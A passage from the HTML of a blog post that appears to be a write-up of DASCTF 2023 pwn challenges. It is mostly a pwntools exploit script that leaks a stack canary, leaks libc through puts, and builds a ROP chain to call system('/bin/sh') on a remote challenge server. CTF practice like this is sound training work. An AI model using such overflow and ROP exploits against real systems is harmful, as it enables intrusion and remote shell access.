class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">a</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Choose an option: &#x27;</span>,<span class="built_in">str</span>(a).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">a,b</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>,a)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;note: &#x27;</span>,a)</span><br><span class="line"><span class="comment"># login(b&#x27;admin\x00&#x27;,b&#x27;root\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    io = remote(<span class="string">&#x27;118.24.31.155&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>) </span><br><span class="line">    <span class="comment"># nc 118.24.31.155 9999</span></span><br><span class="line">    login(<span class="string">b&#x27;admin\x00&#x27;</span>,<span class="string">b&#x27;root\x00&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: \n&#x27;</span>, <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">    result = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;give you a gif&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.close()</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0401AC3&#x27;)</span></span><br><span class="line"></span><br><span class="line">add(p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(result.split(<span class="string">b&#x27;!&#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">ret_ad=<span class="number">0x4012D0</span></span><br><span class="line">setrdi=<span class="number">0x0401CB6</span></span><br><span class="line">paylaod=<span class="number">0x40</span>*<span class="string">b&#x27;a&#x27;</span>+flat([canary,<span class="number">0</span>,setrdi,elf.plt[<span class="string">&#x27;puts&#x27;</span>],ret_ad])</span><br><span class="line">logout()</span><br><span class="line">login(<span class="string">b&#x27;admin&#x27;</span>,paylaod)</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=find_libc(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libcelf.address=libcbase</span><br><span class="line">pop_rdi_ret=<span class="built_in">next</span>(libcelf.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(pop_rdi_ret)</span><br><span class="line">binsh=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+libcbase</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+libcbase</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">add(p64(binsh))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">logout()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rop.ret.address))</span><br><span class="line">payload=<span class="number">0x40</span>*<span class="string">b&#x27;a&#x27;</span>+flat([canary,<span class="number">0</span>,setrdi,system])<span class="comment">#最后用pop rdi给system参数赋值的话，由于栈地址对齐需要垫一个ret，溢出长度会不够</span></span><br><span class="line">login(<span class="string">b&#x27;admin&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#FileEditor"><span class="toc-number">1.</span> <span class="toc-text">FileEditor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VIPhouse"><span class="toc-number">2.</span> <span class="toc-text">VIPhouse</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&text=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&title=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&is_video=false&description=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn&body=Check out this article: https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&title=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&title=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&title=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&title=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&name=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/07/24/2023-DASCTF-0X401/&t=DASCTF 2023 &amp; 0X401七月暑期挑战赛 pwn"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    bxz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
